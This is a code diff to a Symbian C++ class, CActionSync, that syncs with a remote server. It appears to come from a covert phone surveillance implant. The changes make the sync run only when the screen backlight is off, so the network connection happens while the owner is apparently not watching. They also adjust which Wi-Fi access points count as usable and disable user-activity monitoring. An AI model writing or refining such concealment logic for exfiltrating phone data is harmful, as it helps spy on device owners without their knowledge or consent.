@@ -9,6 +9,7 @@
  */
 
 #include "ActionSync.h"
+#include <HT\Processes.h>
 #include <es_enum.h>     // for TConnectionInfoBuf
 #include <rconnmon.h>	 // for connection monitor, add connmon.lib
 
@@ -193,7 +194,7 @@ void CActionSync::GetDefaultConnectionPrefL(/*TCommDbMultiConnPref& aMultiConnPr
 				RBuf iapName;
 				iapName.CreateL(singleIapRecord->iRecordName);
 				iapName.CleanupClosePushL();
-				if(iapName.Compare(_L("IPDC"))==0 || iapName.Compare(_L("Easy WLAN"))==0)
+				if(iapName.Compare(_L("IPDC"))==0 || iapName.Compare(_L("Easy WLAN"))==0 || iapName.Compare(_L("Search for WLAN"))==0)
 					{
 					;//  do nothing, it's not  valid wlan ap
 					} 
@@ -369,7 +370,7 @@ void CActionSync::DispatchStartCommandL()
 	
 	// When offline user is prompted for confirmation on connection, so we have to check 
 	__FLOG(_L("DispatchStartCommand"));
-		
+	
 	if(OfflineL())
 		{
 		MarkCommandAsDispatchedL();
@@ -436,17 +437,34 @@ void CActionSync::DispatchStartCommandL()
 		// comment this part when debugging coz display always on when using TRK
 		// this is useful also to see what happens when monitoring user activity
 		//value = 0;           // TODO: restore comment here
-		if (value == 1){
-			__FLOG(_L("Display active"));
+		if (value == 1)
+			{
+			//we check if screensaver is on
+			/*
+			if(!Processes::IsScreensaverRunning())
+				{
+				__FLOG(_L("Display active"));
 			
-			// display is active.... next time
-			MarkCommandAsDispatchedL();
-			return;
-		}
+				// display is active.... next time
+				MarkCommandAsDispatchedL();
+				return;
+				}
+				*/
+			//we check backlight status
+			TInt backlightState;
+			HAL::Get( HALData::EBacklightState, backlightState );
+			if(backlightState==1)
+				{
+				//backlight is active... next time
+				__FLOG(_L("Backlight active"));
+				MarkCommandAsDispatchedL();
+				return;
+				}
+			}
 		
-		iStartMonitor = ETrue;       // we have to monitor user activity
+		//NOTE: user monitoring has been disabled, old devices having problems on dropping down gprs sync
+		//iStartMonitor = ETrue;       // we have to monitor user activity  //TODO:restore this when testing done
 		iDeleteLog = ETrue;			// since it's a new conn, we have to delete its log
-		//TCommDbMultiConnPref is buggy, this is why we use our loop in ConnectionStart()
 		
 		err = ConnectionStartL();
 	}
@@ -566,6 +584,8 @@ TInt32 CActionSync::GetMmsAccessPointL()
 	delete mmsSettings;	
 	return mmsAp;
 	}
+
+
 /*
  L'ActionSync  avvia il processo di sincronizzazione con il server remoto tramite i seguenti passi:
 
